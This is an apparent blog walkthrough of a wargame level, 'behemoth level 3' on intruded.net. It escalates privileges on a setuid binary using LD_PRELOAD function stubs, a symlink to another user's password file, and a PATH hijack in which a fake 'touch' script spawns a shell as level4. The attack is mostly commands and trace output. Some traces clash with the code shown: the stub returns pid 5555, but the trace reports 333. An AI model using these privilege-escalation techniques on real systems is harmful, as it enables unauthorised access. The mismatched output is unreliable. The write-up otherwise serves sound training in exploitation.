Title: intruded.net, behemoth: level 3
Date: 2011/09/27 22:32
Author: Ken Ko
Tags: intruded.net, behemoth, ltrace
Category: tutorials

Preliminary testing has shown that there's a <strong>sleep(2000);</strong> call within level3. Let's get rid of that. 

Oh, also, another note: level3 attempts to touch a random file in your current directory so <strong>this must be run from /tmp</strong> where we have write permissions. 

<pre>
<code>
level3@behemoth:/tmp$ cat sleep.c
#include <stdlib.h>

int sleep(int n) {
        return 0;
}
level3@behemoth:/tmp$ !gcc
gcc -fPIC -shared -o sleep.so sleep.c
level3@behemoth:/tmp$ !expo
export LD_PRELOAD="/tmp/sleep.so"
level3@behemoth:/tmp$
level3@behemoth:/tmp$
level3@behemoth:/tmp$ /wargame/level3

level3@behemoth:/tmp$ ltrace /wargame/level3
__libc_start_main(0x80484a4, 1, 0xbffffab4, 0x80485c0, 0x8048570 <unfinished ...>
getpid()                                            = 2555
seteuid(1004)                                       = -1
sprintf("touch 2555", "touch %d", 2555)             = 10
__lxstat(3, "2555", 0xbffff990)                     = -1
unlink("2555")                                      = -1
system("touch 2555" <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                              = 0
sleep(2000)                                         = 0
sprintf("cat ", "cat ")                             = 4
system("cat   2555" <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                              = 0
+++ exited (status 0) +++
level3@behemoth:/tmp$
</code>
</pre>

Hot.

Let's try to get rid of that sleep(), among other things:

<pre>
<code>
level3@behemoth:/tmp$ cat sleep.c
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
//#include <unistd.h>

int lstat (const char *c, struct stat *s) {
        return 0;
}

int unlink (const char * c) {
        return 0;
}

pid_t getpid(void) {
        return 5555;
}

int sleep(int n) {
        return 0;
}
</code>
</pre>

Now we have a fixed pid that gets returned so we know we'll be looking for <strong>/bin/333</strong>. 

<pre>
<code>
level3@behemoth:/tmp$ export LD_PRELOAD="/tmp/sleep.so"
level3@behemoth:/tmp$ ls -lh 5555
lrwxrwxrwx 1 level3 level3 20 2011-09-15 03:57 5555 -> /home/level4/.passwd
level3@behemoth:/tmp$ ltrace /wargame/level3
__libc_start_main(0x80484a4, 1, 0xbffffa94, 0x80485c0, 0x8048570 <unfinished ...>
getpid()                                            = 333
seteuid(1004)                                       = -1
sprintf("touch 5555", "touch %d", 5555)               = 10
__lxstat(3, "5555", 0xbffff970)                      = 0
unlink("333")                                       = 0
system("touch 333" <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                              = 0
sleep(2000)                                         = 0
sprintf("cat ", "cat ")                             = 4
system("cat   333"#!/bin/bash
whoami
/bin/sh
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                              = 0
+++ exited (status 0) +++
level3@behemoth:/tmp$
</code>
</pre>

Thing is, we now get a lot of permission denied; incredibly lame! But wait! What is this?

<em>system("touch 333"</em>

What if we had a script named touch... wouldn't it be run? Time to get a shell.

<pre>
<code>
level3@behemoth:/tmp$ chmod +x touch
level3@behemoth:/tmp$ cat touch
/bin/sh
level3@behemoth:/tmp$ PATH="/tmp" /wargame/level3
sh-3.1$ /usr/bin/whoami
level4
sh-3.1$
</code>
</pre>

Awesome possum; time to move on.
